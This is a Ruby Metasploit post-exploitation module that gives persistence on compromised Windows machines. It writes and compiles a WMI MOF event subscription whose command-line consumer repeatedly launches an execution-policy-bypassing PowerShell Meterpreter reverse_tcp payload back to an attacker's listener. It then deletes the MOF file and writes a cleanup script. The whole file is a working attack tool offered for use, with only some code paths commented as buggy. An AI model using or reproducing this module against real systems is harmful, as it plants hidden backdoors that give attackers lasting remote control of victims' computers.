#######
# For use with Metasploit.
#  Written by khr0x40sh [ http://khr0x40sh.wordpress.com/ ]
#  Borrowed pieces from existing modules such as msfvenom, ms14_064_ie_powershell
#  and ofc the post windows manage exec_powershell
#  
#  ISSUES:
#  Could not get the cmd_psh_payload function in msf core exploit powershell
#  to successfully return a shell or execute code
#    -it appears that if you uncompress the encoded b64, the command seems to be
#      truncated.  But cmd_psh_payload works in ms14_064, so could be a bug here?
#  
#  I would not use an interval less than 10 seconds - the handler seems to not like 
#   that many connections coming back at once
#
#  Lastly, use of this code is AS IS.  I am not responsible, nor should Rapid 7 be.
#    If you are using metasploit, and reading this, I would think you get that by now.
##

require 'zlib' # TODO: check if this can be done with REX

require 'msf/core'
require 'msf/core/payload_generator'
require 'msf/core/exploit/powershell'	#may need to tweak this code a bit later
require 'rex'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Windows Managed Object Files Persistence via Powershell",
      'Description'          => %q{
        This module will attempt to use MOF to establish persistence on a machine as an alternative to the persistence meterpreter script. This will require at least local administrative rights and powershell present on the machine (default on Vista/2k8/7/2012).
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      #'Payload'        =>
       # {
       #   'BadChars'        => "\x00", #don't think this is necessary
       # },
      'DefaultOptions'  =>
        {
          'EXITFUNC'         => "none"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Tested on (32 bits):
          # * Windows XP SP3		#well if it has powershell
          # * Windows 2003 SP2		#same as above
          # * Windows 7 SP1
          # * Windows 2008
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          # Tested on (64 bits):
          # * Windows 7 SP1
          # * Windows 2008 R2 SP1
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'Author'               => [
        '@khr0x40sh <khr0x40sh.wordpress.com>'
        ],
      'DefaultTarget'  => 0))

    register_options(
      [
	OptInt.new( 'INTERVAL', [true, 'Interval between meterpreter callbacks (sec)', 60]),
	OptString.new('CLASSNAME', [false, 'MOF Event and CommandLine Consumer Class Name (default is random)']),
	OptAddress.new( 'LHOST', [ false, 'Listener IP address for the new session' ]),
	OptInt.new( 'LPORT', [false, 'Local Port to connect back to', 4444]),
	OptString.new( 'PAYLOAD', [false, 'Payload to use, default is windows/meterpreter/reverse_tcp', 'windows/meterpreter/reverse_tcp'])
      ], self.class)

    register_advanced_options(
      [
        OptString.new('W_PATH',  [false, 'PATH to write temporary MOF', '%TEMP%' ]),
        OptBool.new(  'DELETE',  [false, 'Delete MOF after execution', true ]),
        OptBool.new(  'DRY_RUN', [false, 'Only show what would be done', false ]), 
        OptInt.new('TIMEOUT',    [false, 'Execution timeout', 15]),	#doesn't currently work
      ], self.class)

  end
#
#  
  def run
    # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return 0 if ! (session.type == "meterpreter")

    path=""
    if datastore['W_PATH'].include? "%"
	path1 = datastore['W_PATH']
	path2 = path1.split("\\")
		
	path2.each do |i|
		if i.include? "%"
			i.gsub!("%","")
			i =session.sys.config.getenv(path1)	
		end
		path.concat("#{i}\\")
	end
    else
	path = datastore['W_PATH']
    end 
       
    @arch = session.sys.config.getenv('ARCH')

    payl = setup_pay

    mof_class_name = datastore['CLASSNAME'] || Rex::Text.rand_text_alpha((rand(8)+6))

    print_status("Running MOF persistence script...")
    print_status("")
    vprint_status("Using Interval of #{datastore['INTERVAL']}")
  
    mof_header="#pragma namespace(\"\\\\.\\root\\subscription\")\n"
    mof_filter ="instance of __EventFilter as $FILTER\n"
    mof_filter +="{\n"
    mof_filter +="   Name = \"#{mof_class_name}\";\n"
    mof_filter +="   EventNamespace = \"root\\cimv2\";\n"
    mof_filter +="   Query = \"SELECT * FROM __InstanceModificationEvent \"\n"
    mof_filter +="   \"WITHIN #{datastore['INTERVAL']} WHERE TargetInstance ISA 'Win32_PerfFormattedDATA_PerfOS_System' AND \"\n"
    mof_filter +="   \"TargetInstance.SystemUpTime >=360\";\n"
    mof_filter +="   QueryLanguage = \"WQL\";\n"
    mof_filter +="};\n"

    mof_consumer = "instance of CommandLineEventConsumer as $CONSUMER\n"
    mof_consumer +="{\n"
    mof_consumer +="   Name = \"#{mof_class_name}\";\n"
    mof_consumer +="   RunInteractively = false;\n"
    mof_consumer +="   CommandLineTemplate = \"powershell.exe -exec Bypass -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=[string]::Concat(' ''',$env:windir, '\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe''')};$t=New-Object System.Diagnostics.ProcessStartInfo;$t.FileName=$b;$t.Arguments=''-exec Bypass -c #{payl}'';$t.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($t);\";\n"
    mof_consumer +="};\n"

    mof_binding = "instance of __FilterToConsumerBinding\n"
    mof_binding +="{\n"
    mof_binding +="	Consumer = $CONSUMER;\n"
    mof_binding +="	Filter = $FILTER;\n"
    mof_binding +="};\n"


    vprint_status("payload output")
    vprint_status("#{payl}")
    mof = mof_header + mof_filter + mof_consumer + mof_binding

    ### house cleaning to get our MOF to compile and execute porperly
    mof.gsub!('\\', '\\\\\\')
    mof.gsub!("''","\\\\\\\\\\\\\"")
    ##################################

    if datastore['DRY_RUN']
       print_good("MOF\n #{mof}")
       return
    end
    print_status(path)
    #### Write to Disk
    file  = Rex::Text.rand_text_alpha((rand(8)+6)) + ".mof"
    file = path +""+ file
      fd = session.fs.file.new(file, "wb")
      print_status("Writing #{file}...")
      fd.write(mof)
      fd.close
    ### Run mofcomp.  If we are not at least local admin, this may fail
    cmd_out, running_pids, open_channels = cmd_exec("mofcomp "+file)
    print_status(cmd_out)

    if datastore['DELETE']
    	#Clean up
        file.gsub!('\\', '\\\\\\')
    	print_status("Cleaning up remnant MOF #{file}") 
        rm_f(file)
    end
    # Create undo script
    @clean_up_rc = log_file()
       print_status("Writing cleanup script #{@clean_up_rc}...")
       file_local_write(@clean_up_rc, "execute -f powershell.exe -a \"-exec Bypass gwmi -namespace root\\\\subscription -query \\\\\\\"SELECT * FROM __EventFilter WHERE Name='#{mof_class_name}'\\\\\\\" | rwmi \"")
       file_local_write(@clean_up_rc, "execute -f powershell.exe -a \"-exec Bypass gwmi -namespace root\\\\subscription -query \\\\\\\"SELECT * FROM CommandLineEventConsumer WHERE Name='#{mof_class_name}'\\\\\\\" | rwmi \"")
       file_local_write(@clean_up_rc, "execute -f powershell.exe -a \"-exec Bypass gwmi -namespace root\\\\subscription -query \\\\\\\"SELECT * FROM __FilterToConsumerBinding WHERE __PATH LIKE '%Name=__#{mof_class_name}%'\\\\\\\" | rwmi \"")
     #print_status("Resource file for cleanup created at #{@clean_up_rc}")
     vprint_status("Quick removal command line: C:\\>powershell.exe -exec Bypass gwmi -namespace root\\subscription -query \"SELECT * FROM CommandLineEventConsumer WHERE Name='#{mof_class_name}'\"")
     vprint_status("This will only stop the MOF persistence and clean the CommandLineEventConsumer.  For a full clean, use #{@clean_up_rc}.")
	
    # That's it
    print_good('Finished!')
  end

  def setup_pay
      lhost = datastore["LHOST"] || Rex::Socket.source_address
      lport = datastore["LPORT"] || 4444
      p_mod = datastore['PAYLOAD'] || "windows/meterpreter/reverse_tcp"

     #borrowed from msfvenom.rb
      generator_opts = {}

      generator_opts[:payload] = p_mod
      generator_opts[:datastore] = datastore

      generator_opts[:format] = "psh-net"
      generator_opts[:framework] = framework
      #generator_opts[:badchars] = "\x00"

      begin
        venom_generator =  Msf::PayloadGenerator.new(generator_opts)
        psh_payload = venom_generator.generate_payload
      rescue ::Exception => e
        elog("#{e.class} : #{e.message}\n#{e.backtrace * "\n"}")
        print_error(e.message)
      end

	compressed_payload = compress_script(psh_payload)
    	encoded_payload = encode_script(psh_payload)
	
	pay1 = compressed_payload
	pay1.gsub!("$s","`$s")      
	return pay1

##########################################################################
# Further investigation is needed to discern why the cmd_psh_payload seems to get cut off when used by ISE/WMI/etc...
#  could be operator error or not.
###      
      payload = session.framework.payloads.create(p_mod)
      payload.datastore['LHOST'] = lhost
      payload.datastore['LPORT'] = lport
      
      pay1 =cmd_psh_payload(payload,"x86",{ :remove_comspec => true, :method => "reflection" }) #might be broken?  #crashes on win 7 x64, powershell code complains about not finding dlls in ISE.  

	
     # pay1.sub!("{$b='powershell.exe'","{$b=''powershell.exe''")
     # pay1.sub!("$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'", "[string]::Concat(' '' ',$env:windir,'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'' ')")
      #pay1.sub!("'","''")
      #pay1.sub!("'","''")
     # pay1.slice! "powershell.exe "
      #pay2 = pay1.split("''") 
      return pay1
      #return pay2[1]
  end

#straight up stolen from persistence.rb
def log_file(log_path = nil)
  @client = client
  #Get hostname
  host = @client.sys.config.sysinfo["Computer"]

  # Create Filename info to be appended to downloaded files
  filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

  # Create a directory for the logs
  if log_path
    logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
  else
    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
  end

  # Create the log directory
  ::FileUtils.mkdir_p(logs)

  #logfile name
  logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
  return logfile
end

end



